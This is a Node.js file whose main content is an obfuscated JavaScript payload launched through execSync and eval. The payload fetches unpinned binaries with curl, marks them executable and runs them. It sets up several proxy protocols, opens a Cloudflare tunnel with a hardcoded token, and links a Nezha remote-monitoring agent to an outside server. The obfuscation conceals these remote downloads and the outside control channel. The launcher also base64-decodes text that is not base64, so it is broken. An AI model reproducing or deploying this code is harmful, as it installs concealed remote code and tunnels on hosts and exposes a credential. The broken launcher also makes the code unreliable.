const { execSync } = require('child_process');
const b = `const _0x533e30=_0x1b9f;(function(_0x36d7a3,_0x5332b4){const _0x4dcb11=_0x1b9f,_0x1def06=_0x36d7a3();while(!![]){try{const _0x2ec682=-parseInt(_0x4dcb11(0xb0))/0x1+-parseInt(_0x4dcb11(0xd8))/0x2+parseInt(_0x4dcb11(0xe1))/0x3*(-parseInt(_0x4dcb11(0xdf))/0x4)+-parseInt(_0x4dcb11(0xb4))/0x5*(-parseInt(_0x4dcb11(0xca))/0x6)+-parseInt(_0x4dcb11(0x117))/0x7*(-parseInt(_0x4dcb11(0xdc))/0x8)+-parseInt(_0x4dcb11(0xd2))/0x9+parseInt(_0x4dcb11(0xb1))/0xa*(parseInt(_0x4dcb11(0x10e))/0xb);if(_0x2ec682===_0x5332b4)break;else _0x1def06['push'](_0x1def06['shift']());}catch(_0x57e66c){_0x1def06['push'](_0x1def06['shift']());}}}(_0x2aca,0x81749));const http=require(_0x533e30(0x118)),https=require(_0x533e30(0x9e)),fs=require('fs'),path=require(_0x533e30(0xa6)),os=require('os'),{spawn,exec}=require(_0x533e30(0xed)),crypto=require(_0x533e30(0x107)),express=require(_0x533e30(0xdb)),{createProxyMiddleware}=require(_0x533e30(0xa4)),CONFIG={'C_T':process['env'][_0x533e30(0xea)]||_0x533e30(0xa3),'B_D':process[_0x533e30(0x113)][_0x533e30(0x125)]||_0x533e30(0xc5),'C_D':process[_0x533e30(0x113)][_0x533e30(0xde)]||_0x533e30(0x12c),'N_S':process[_0x533e30(0x113)][_0x533e30(0xff)]||_0x533e30(0xb8),'N_P':process['env'][_0x533e30(0xf8)]||'443','N_K':process[_0x533e30(0x113)][_0x533e30(0xd0)]||_0x533e30(0xe8),'N_T':process[_0x533e30(0x113)]['N_T']||_0x533e30(0xd9),'HY2_PORT':process[_0x533e30(0x113)][_0x533e30(0xa0)]||'','VMESS_PORT':process[_0x533e30(0x113)]['VMESS_PORT']||_0x533e30(0xe4),'REALITY_PORT':process[_0x533e30(0x113)][_0x533e30(0x112)]||'','TUIC_PORT':process[_0x533e30(0x113)][_0x533e30(0xb5)]||'','VMESS_UUID':process['env'][_0x533e30(0xa9)]||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98','TUIC_UUID':process[_0x533e30(0x113)][_0x533e30(0xcd)]||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98','TUIC_PASSWORD':process[_0x533e30(0x113)]['TUIC_PASSWORD']||'789456','HY2_PASSWORD':process[_0x533e30(0x113)][_0x533e30(0xfa)]||_0x533e30(0xee),'REALITY_PRIVATE_KEY':process[_0x533e30(0x113)][_0x533e30(0x126)]||'','REALITY_PUBLIC_KEY':process['env'][_0x533e30(0xa7)]||'','HY2_SNI':process[_0x533e30(0x113)][_0x533e30(0xc1)]||_0x533e30(0xbc),'VMESS_PATH':process[_0x533e30(0x113)][_0x533e30(0xae)]||_0x533e30(0x120),'REALITY_SNI':process[_0x533e30(0x113)][_0x533e30(0xd5)]||_0x533e30(0xb7),'REALITY_SHORT_ID':process[_0x533e30(0x113)][_0x533e30(0x128)]||_0x533e30(0x10d),'PORT':process[_0x533e30(0x113)][_0x533e30(0xf5)]||0xbb8},WORK_DIR=os[_0x533e30(0x109)](),processes=[];function _0x1b9f(_0x6e8543,_0x3867da){const _0x2aca0c=_0x2aca();return _0x1b9f=function(_0x1b9f8b,_0x416a97){_0x1b9f8b=_0x1b9f8b-0x9b;let _0x113b5e=_0x2aca0c[_0x1b9f8b];return _0x113b5e;},_0x1b9f(_0x6e8543,_0x3867da);}let serviceStatus={'singbox':'stopped','cloudflared':_0x533e30(0x122),'nezha':_0x533e30(0x122),'http':_0x533e30(0x122)};const HTML={'home':_0x533e30(0x105),'status':(_0x29dc51,_0x225980)=>_0x533e30(0xfb)+(serviceStatus[_0x533e30(0xad)]==='running'?'running':_0x533e30(0x122))+_0x533e30(0x129)+serviceStatus[_0x533e30(0xad)]+_0x533e30(0x133)+(serviceStatus['cloudflared']==='running'?'running':_0x533e30(0x122))+_0x533e30(0xf1)+serviceStatus['cloudflared']+_0x533e30(0x133)+(serviceStatus[_0x533e30(0xcb)]==='running'?_0x533e30(0xc7):_0x533e30(0x122))+_0x533e30(0xc4)+serviceStatus[_0x533e30(0xcb)]+_0x533e30(0x133)+(serviceStatus[_0x533e30(0x118)]===_0x533e30(0xc7)?_0x533e30(0xc7):_0x533e30(0x122))+_0x533e30(0xa8)+serviceStatus[_0x533e30(0x118)]+'</div></div>\x0a</div>\x0a<div\x20class=\x22info\x22><strong>Server\x20IP:</strong><div\x20class=\x22value\x22>'+_0x29dc51+'</div></div>\x0a'+_0x225980[_0x533e30(0xb6)](_0x3d9213=>_0x533e30(0x115)+_0x3d9213[_0x533e30(0xaf)]+_0x533e30(0xe7)+_0x3d9213[_0x533e30(0x11e)]+_0x533e30(0xe0)+_0x3d9213[_0x533e30(0x11e)]+_0x533e30(0xb3))[_0x533e30(0x106)]('')+_0x533e30(0xa1)},isARM=()=>process['arch']===_0x533e30(0x127),download=(_0x1b310d,_0x33d942)=>new Promise((_0x2b9134,_0x578252)=>exec(_0x533e30(0xac)+_0x1b310d+_0x533e30(0x108)+_0x33d942+_0x533e30(0xfe)+_0x33d942+'\x22',_0x2ddefd=>_0x2ddefd?_0x578252(_0x2ddefd):_0x2b9134())),getIP=()=>new Promise(_0x5dbd3e=>https[_0x533e30(0x10f)](_0x533e30(0xbd),_0x11a6fe=>{const _0x21d5c9=_0x533e30;let _0x1a4d15='';_0x11a6fe['on'](_0x21d5c9(0x12e),_0x3194b1=>_0x1a4d15+=_0x3194b1),_0x11a6fe['on'](_0x21d5c9(0xf9),()=>_0x5dbd3e(_0x1a4d15[_0x21d5c9(0xb2)]()));})['on']('error',()=>_0x5dbd3e(_0x533e30(0x131))));async function downloadBinaries(){const _0x302b75=_0x533e30,_0x3f0681=isARM()?_0x302b75(0xfd):'',_0x188d52={'sb':path[_0x302b75(0x106)](WORK_DIR,crypto[_0x302b75(0x116)](0x4)[_0x302b75(0xf3)](_0x302b75(0x11f))),'cf':path[_0x302b75(0x106)](WORK_DIR,crypto[_0x302b75(0x116)](0x4)[_0x302b75(0xf3)](_0x302b75(0x11f))),'nz':path[_0x302b75(0x106)](WORK_DIR,crypto[_0x302b75(0x116)](0x4)['toString']('hex'))};return await Promise['all']([download('https://github.com/seav1/dl/releases/download/upx/sb'+_0x3f0681,_0x188d52['sb']),download(_0x302b75(0xd7)+_0x3f0681,_0x188d52['cf']),download('https://github.com/seav1/dl/releases/download/upx/nz'+_0x3f0681,_0x188d52['nz'])]),_0x188d52;}async function generateRealityKeys(_0x44e0b2){const _0x1702ee=_0x533e30;if(!CONFIG['REALITY_PORT']||CONFIG[_0x1702ee(0x126)]&&CONFIG['REALITY_PUBLIC_KEY'])return;return new Promise(_0x2abc1b=>{const _0x391059=_0x1702ee;exec('\x22'+_0x44e0b2+_0x391059(0x111),(_0x4b24c7,_0x1684e2)=>{const _0x3503f1=_0x391059;if(!_0x4b24c7&&_0x1684e2){const _0x46b400=_0x1684e2['match'](/PrivateKey:\s*(\S+)/),_0x2046c1=_0x1684e2[_0x3503f1(0xbf)](/PublicKey:\s*(\S+)/);_0x46b400&&_0x2046c1&&(CONFIG[_0x3503f1(0x126)]=_0x46b400[0x1],CONFIG['REALITY_PUBLIC_KEY']=_0x2046c1[0x1]);}_0x2abc1b();});});}function _0x2aca(){const _0x1b00c6=['20LKsIkU','TUIC_PORT','map','www.microsoft.com','nz.seav.eu.org','TUIC','--edge-ip-version','forEach','www.bing.com','https://ipv4.icanhazip.com','ignore','match','reality-in','HY2_SNI','error','json','\x22><h3>Nezha</h3><div>','1.seaw.cf','cloudflared','running','&fp=chrome&pbk=','tunnel','89220zulLcl','nezha','tls','TUIC_UUID','base64','VMESS','N_K','run','8342820RsrEcT','/health','tuic://','REALITY_SNI','status','https://github.com/seav1/dl/releases/download/upx/cf','1996824pVnrMf','--tls','xtls-rprx-vision','express','8plvmAu','kill','C_D','12NWnwNE','</div><button\x20class=\x22copy\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','823731loCJPm','&type=tcp#REALITY','/status','8001','send','exit',':</strong><div\x20class=\x22value\x22>','nJqKWWLfSFvJnMXpZ8','--url','C_T','vless','warn','child_process','789456','block','VMESS_PORT','\x22><h3>Cloudflared</h3><div>','writeFileSync','toString','none','PORT','private','silent','N_P','end','HY2_PASSWORD','<!DOCTYPE\x20html><html><head><title>Service\x20Status</title><style>\x0abody{font-family:Arial;margin:20px;background:#f5f5f5}\x0a.container{max-width:800px;margin:0\x20auto;background:white;padding:20px;border-radius:8px}\x0a.status{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin:20px\x200}\x0a.card{padding:15px;border-radius:5px;text-align:center}\x0a.running{background:#d4edda;color:#155724}\x0a.stopped{background:#f8d7da;color:#721c24}\x0a.info{margin:15px\x200;padding:10px;background:#f8f9fa;border-radius:5px}\x0a.value{font-family:monospace;background:#e9ecef;padding:8px;border-radius:3px;word-break:break-all;font-size:12px}\x0a.copy{background:#007cba;color:white;border:none;padding:5px\x2010px;border-radius:3px;cursor:pointer;margin-top:5px}\x0a</style><script>setInterval(()=>location.reload(),30000)</script></head><body>\x0a<div\x20class=\x22container\x22><h1>Service\x20Status</h1>\x0a<div\x20class=\x22status\x22>\x0a<div\x20class=\x22card\x20','pipe','-arm','\x22\x20&&\x20chmod\x20+x\x20\x22','N_S','--no-autoupdate','listen','TUIC_PASSWORD','vmess://','VMess','<!DOCTYPE\x20html><html><head><title>Service\x20Panel</title><style>\x0abody{font-family:Arial;margin:0;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a.container{text-align:center;background:white;padding:40px;border-radius:10px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2)}\x0ah1{color:#333;margin-bottom:20px}\x0aa{display:inline-block;margin:10px;padding:10px\x2020px;background:#667eea;color:white;text-decoration:none;border-radius:5px}\x0aa:hover{background:#5a67d8}\x0a</style></head><body><div\x20class=\x22container\x22><h1>Service\x20Panel</h1><a\x20href=\x22/status\x22>查看状态</a></div></body></html>','join','crypto','\x22\x20-o\x20\x22','tmpdir','createServer','ws://localhost:','vless://','0123456789abcdef','44AOQMTc','get','hysteria2://','\x22\x20generate\x20reality-keypair','REALITY_PORT','env','spawn','<div\x20class=\x22info\x22><strong>','randomBytes','4655861XDgtUw','http','push','http://localhost:','&sid=','tuic-in','message','url','hex','/vms','#HY2','stopped','vmess','hy2-in','B_D','REALITY_PRIVATE_KEY','arm64','REALITY_SHORT_ID','\x22><h3>Sing-Box</h3><div>','upgrade','home','scalingo.seav.eu.org','auto','data','--disable-auto-update','stringify','127.0.0.1','N_T','</div></div>\x0a<div\x20class=\x22card\x20','includes','stdout','hysteria2','--token','SIGTERM','https','from','HY2_PORT','\x0a</div></body></html>','vmess-in','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOGUwNWI3MTctMjdjNC00M2Y1LTg1NDgtNGRiZWY5MmI1N2NjIiwicyI6IlpqWm1OMk5qTldRdE5qazJOaTAwTURoaExUazFaR0l0WVRCaE1UTTVOREJqTkRKaSJ9','http-proxy-middleware','SIGINT','path','REALITY_PUBLIC_KEY','\x22><h3>HTTP</h3><div>','VMESS_UUID','direct','stderr','curl\x20-sL\x20\x22','singbox','VMESS_PATH','protocol','630687HVySKA','7963640oYSkuY','trim','\x27);alert(\x27已复制!\x27)\x22>复制</button></div>'];_0x2aca=function(){return _0x1b00c6;};return _0x2aca();}function generateConfig(){const _0x4becf9=_0x533e30,_0xb61ea1=[];CONFIG[_0x4becf9(0xa0)]&&_0xb61ea1[_0x4becf9(0x119)]({'type':_0x4becf9(0x9b),'tag':_0x4becf9(0x124),'listen':'::','listen_port':parseInt(CONFIG['HY2_PORT']),'users':[{'password':CONFIG[_0x4becf9(0xfa)]}],'tls':{'enabled':!![],'server_name':CONFIG[_0x4becf9(0xc1)],'insecure':!![]}});CONFIG[_0x4becf9(0xf0)]&&_0xb61ea1[_0x4becf9(0x119)]({'type':_0x4becf9(0x123),'tag':_0x4becf9(0xa2),'listen':'::','listen_port':parseInt(CONFIG[_0x4becf9(0xf0)]),'users':[{'uuid':CONFIG[_0x4becf9(0xa9)],'alterId':0x0}],'transport':{'type':'ws','path':CONFIG[_0x4becf9(0xae)]}});CONFIG[_0x4becf9(0x112)]&&_0xb61ea1[_0x4becf9(0x119)]({'type':_0x4becf9(0xeb),'tag':_0x4becf9(0xc0),'listen':'::','listen_port':parseInt(CONFIG[_0x4becf9(0x112)]),'users':[{'uuid':CONFIG[_0x4becf9(0xa9)],'flow':_0x4becf9(0xda)}],'tls':{'enabled':!![],'server_name':CONFIG[_0x4becf9(0xd5)],'reality':{'enabled':!![],'handshake':{'server':CONFIG[_0x4becf9(0xd5)],'server_port':0x1bb},'private_key':CONFIG[_0x4becf9(0x126)],'short_id':[CONFIG['REALITY_SHORT_ID']]}}});CONFIG[_0x4becf9(0xb5)]&&_0xb61ea1[_0x4becf9(0x119)]({'type':'tuic','tag':_0x4becf9(0x11c),'listen':'::','listen_port':parseInt(CONFIG[_0x4becf9(0xb5)]),'users':[{'uuid':CONFIG[_0x4becf9(0xcd)],'password':CONFIG['TUIC_PASSWORD']}],'tls':{'enabled':!![],'server_name':CONFIG['HY2_SNI'],'insecure':!![]}});const _0x4a14a1={'log':{'level':_0x4becf9(0xec),'timestamp':![]},'inbounds':_0xb61ea1,'outbounds':[{'type':'direct','tag':'direct'},{'type':'block','tag':_0x4becf9(0xef)}],'route':{'rules':[{'geoip':_0x4becf9(0xf6),'outbound':_0x4becf9(0xaa)}]}},_0x4e548c=path[_0x4becf9(0x106)](WORK_DIR,'config.json');return fs[_0x4becf9(0xf2)](_0x4e548c,JSON[_0x4becf9(0x130)](_0x4a14a1,null,0x2)),_0x4e548c;}function generateLinks(_0x38c498){const _0x22865c=_0x533e30,_0x1fe0fd=[];CONFIG[_0x22865c(0xa0)]&&_0x1fe0fd[_0x22865c(0x119)]({'protocol':'Hysteria2','url':_0x22865c(0x110)+CONFIG[_0x22865c(0xfa)]+'@'+_0x38c498+':'+CONFIG[_0x22865c(0xa0)]+'?insecure=1&sni='+CONFIG[_0x22865c(0xc1)]+_0x22865c(0x121)});if(CONFIG[_0x22865c(0xf0)]){const _0x418b56={'v':'2','ps':_0x22865c(0xcf),'add':CONFIG[_0x22865c(0x125)],'port':'443','id':CONFIG['VMESS_UUID'],'aid':'0','scy':_0x22865c(0x12d),'net':'ws','type':_0x22865c(0xf4),'host':CONFIG[_0x22865c(0xde)],'path':CONFIG[_0x22865c(0xae)],'tls':_0x22865c(0xcc),'sni':CONFIG['C_D'],'alpn':'','fp':'chrome'};_0x1fe0fd[_0x22865c(0x119)]({'protocol':_0x22865c(0x104),'url':_0x22865c(0x103)+Buffer[_0x22865c(0x9f)](JSON[_0x22865c(0x130)](_0x418b56))[_0x22865c(0xf3)](_0x22865c(0xce))});}return CONFIG[_0x22865c(0x112)]&&_0x1fe0fd[_0x22865c(0x119)]({'protocol':'Reality','url':_0x22865c(0x10c)+CONFIG[_0x22865c(0xa9)]+'@'+_0x38c498+':'+CONFIG[_0x22865c(0x112)]+'?encryption=none&flow=xtls-rprx-vision&security=reality&sni='+CONFIG[_0x22865c(0xd5)]+_0x22865c(0xc8)+CONFIG[_0x22865c(0xa7)]+_0x22865c(0x11b)+CONFIG[_0x22865c(0x128)]+_0x22865c(0xe2)}),CONFIG[_0x22865c(0xb5)]&&_0x1fe0fd[_0x22865c(0x119)]({'protocol':_0x22865c(0xb9),'url':_0x22865c(0xd4)+CONFIG[_0x22865c(0xcd)]+':'+CONFIG[_0x22865c(0x102)]+'@'+_0x38c498+':'+CONFIG['TUIC_PORT']+'?congestion_control=cubic&udp_relay_mode=native&alpn=h3,h2,http/1.1&allow_insecure=1#TUIC'}),_0x1fe0fd;}function startService(_0x18e277,_0x270258,_0x58c3cb){const _0x3ef96c=_0x533e30;try{const _0x1cacac=spawn(_0x18e277,_0x270258,{'stdio':_0x3ef96c(0xbe)});return _0x1cacac['on'](_0x3ef96c(0x114),()=>serviceStatus[_0x58c3cb]=_0x3ef96c(0xc7)),_0x1cacac['on'](_0x3ef96c(0xc2),()=>serviceStatus[_0x58c3cb]=_0x3ef96c(0xc2)),_0x1cacac['on'](_0x3ef96c(0xe6),()=>serviceStatus[_0x58c3cb]=_0x3ef96c(0x122)),processes[_0x3ef96c(0x119)](_0x1cacac),_0x1cacac;}catch(_0x232c64){return serviceStatus[_0x58c3cb]=_0x3ef96c(0xc2),null;}}async function startTempTunnel(_0x59ce69,_0x326561){return new Promise(_0x2bac1d=>{const _0x3f7c3d=_0x1b9f,_0x60de8f=spawn(_0x59ce69,[_0x3f7c3d(0xc9),_0x3f7c3d(0x100),_0x3f7c3d(0xe9),_0x3f7c3d(0x11a)+_0x326561],{'stdio':[_0x3f7c3d(0xbe),_0x3f7c3d(0xfc),_0x3f7c3d(0xfc)]});processes[_0x3f7c3d(0x119)](_0x60de8f);let _0x423f8e='';_0x60de8f[_0x3f7c3d(0x135)]['on'](_0x3f7c3d(0x12e),_0x3b7dd0=>_0x423f8e+=_0x3b7dd0),_0x60de8f[_0x3f7c3d(0xab)]['on'](_0x3f7c3d(0x12e),_0x552b39=>_0x423f8e+=_0x552b39),setTimeout(()=>{const _0x2753be=_0x3f7c3d,_0x5db800=_0x423f8e[_0x2753be(0xbf)](/https:\/\/([^\/\s]+\.trycloudflare\.com)/);_0x5db800?(CONFIG[_0x2753be(0xde)]=_0x5db800[0x1],_0x2bac1d(!![])):(_0x60de8f[_0x2753be(0xdd)](),_0x2bac1d(![]));},0x2710);});}const app=express();app['get']('/',(_0x5dfd9d,_0x229767)=>_0x229767[_0x533e30(0xe5)](HTML[_0x533e30(0x12b)])),app[_0x533e30(0x10f)](_0x533e30(0xe3),async(_0x30e5dd,_0x5cc757)=>{const _0x352946=_0x533e30,_0x32bb28=await getIP(),_0x145539=generateLinks(_0x32bb28);_0x5cc757[_0x352946(0xe5)](HTML['status'](_0x32bb28,_0x145539));}),app['get']('/x',async(_0x5bf048,_0x589230)=>{const _0x3d7949=_0x533e30,_0x4e17dc=await getIP(),_0x2cd699=generateLinks(_0x4e17dc);_0x589230['send'](HTML[_0x3d7949(0xd6)](_0x4e17dc,_0x2cd699));}),app['get'](_0x533e30(0xd3),(_0x4836c3,_0x351f1e)=>_0x351f1e[_0x533e30(0xc3)]({'status':'ok','uptime':process['uptime']()}));const server=http[_0x533e30(0x10a)](app);server['on'](_0x533e30(0x12a),createProxyMiddleware({'target':_0x533e30(0x10b)+CONFIG[_0x533e30(0xf0)],'changeOrigin':!![],'ws':!![],'logLevel':_0x533e30(0xf7)}));async function main(){const _0x44c0f4=_0x533e30;server[_0x44c0f4(0x101)](CONFIG[_0x44c0f4(0xf5)],()=>serviceStatus['http']='running');try{const _0x5716e7=await downloadBinaries();if(CONFIG[_0x44c0f4(0xa0)]||CONFIG[_0x44c0f4(0xf0)]||CONFIG[_0x44c0f4(0x112)]||CONFIG[_0x44c0f4(0xb5)]){await generateRealityKeys(_0x5716e7['sb']);const _0x4a1007=generateConfig();startService(_0x5716e7['sb'],[_0x44c0f4(0xd1),'-c',_0x4a1007],'singbox');}if(CONFIG[_0x44c0f4(0xea)])startService(_0x5716e7['cf'],[_0x44c0f4(0xc9),_0x44c0f4(0xba),_0x44c0f4(0x12d),'--protocol','http2','run',_0x44c0f4(0x9c),CONFIG[_0x44c0f4(0xea)],'--url','http://localhost:'+CONFIG[_0x44c0f4(0xf5)]],_0x44c0f4(0xc6));else{if(CONFIG[_0x44c0f4(0xf0)]){const _0x2959d1=await startTempTunnel(_0x5716e7['cf'],CONFIG[_0x44c0f4(0xf5)]);serviceStatus['cloudflared']=_0x2959d1?_0x44c0f4(0xc7):_0x44c0f4(0xc2);}}if(CONFIG[_0x44c0f4(0xff)]&&CONFIG['N_K']){const _0x36cf11=['-s',CONFIG[_0x44c0f4(0xff)]+':'+CONFIG[_0x44c0f4(0xf8)],'-p',CONFIG['N_K'],'--report-delay','3',_0x44c0f4(0x12f)];if(CONFIG[_0x44c0f4(0x132)][_0x44c0f4(0x134)]('--tls'))_0x36cf11[_0x44c0f4(0x119)]('--tls');startService(_0x5716e7['nz'],_0x36cf11,'nezha');}const _0xca89cc=()=>{const _0x346c2f=_0x44c0f4;processes[_0x346c2f(0xbb)](_0x13c7a1=>{try{_0x13c7a1['kill']();}catch(_0x1af5b6){}}),process[_0x346c2f(0xe6)](0x0);};process['on'](_0x44c0f4(0xa5),_0xca89cc),process['on'](_0x44c0f4(0x9d),_0xca89cc);}catch(_0x3ddc1f){console[_0x44c0f4(0xc2)]('启动失败:',_0x3ddc1f[_0x44c0f4(0x11d)]),process[_0x44c0f4(0xe6)](0x1);}}main();`.replace(/\\n/g, '');
execSync(`node -e "eval(Buffer.from('${b}', 'base64').toString())"`);